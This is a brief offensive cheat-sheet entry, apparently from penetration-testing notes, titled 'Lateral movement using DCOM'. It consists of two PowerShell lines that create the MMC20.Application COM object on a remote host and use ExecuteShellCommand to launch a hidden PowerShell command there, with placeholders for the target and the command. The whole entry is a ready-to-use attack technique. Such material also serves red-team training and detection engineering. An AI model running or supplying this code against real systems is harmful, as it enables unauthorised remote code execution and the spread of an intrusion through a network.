### Lateral movement using DCOM
```
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<domain>"))
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,'-NoP -W Hidden -Command "<command>"',$null)
```

